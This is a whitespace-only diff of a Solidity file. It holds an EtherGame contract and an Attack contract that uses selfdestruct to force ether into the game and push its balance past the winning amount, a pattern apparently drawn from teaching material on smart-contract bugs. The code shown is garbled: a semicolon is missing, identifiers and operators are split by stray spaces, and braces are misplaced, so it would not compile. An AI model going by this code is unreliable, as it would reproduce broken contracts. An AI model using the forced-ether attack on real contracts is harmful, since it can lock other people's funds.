@@ -11,21 +11,21 @@ contract EtherGame {
    uint public targetAmount = 7 ether ;
    address public winner;
    uint public balance
-    function deposit ( ) public payable {
-        require ( msg.value == 1 ether , " You can only send 1 Ether " ) ;
+    function deposit( ) public payable {
+        require( msg.value == 1 ether , " You can only send 1 Ether " ) ;
    }
         //uint balance = address(this).balance ; avoid using this
         balance += msg.value;
-        require ( balance < = targetAmount , "Game is over" ) ;
-        if ( balance == target Amount ) {
+        require(balance < = targetAmount , "Game is over" ) ;
+        if(balance == target Amount) {
             winner = msg.sender ;
        }
     function claimReward() public {
-        require (msg.sender == winner , " Not winner ") ;
+        require(msg.sender == winner , " Not winner ");
          (bool sent,) = msg.sender.call { value : address(this).balance }( " " );
         require ( sent , " Failed to send Ether " ) ;
         }
-    function getBalance() public view returns ( uint ) {
+    function getBalance() public view returns(uint) {
         return address(this).balance ;}
 
 }
@@ -33,7 +33,7 @@ contract EtherGame {
 
 
 contract Attack {
-    function attack ( address payable target ) public payable {
+    function attack( address payable target ) public payable {
         selfdestruct(target);
         
     }
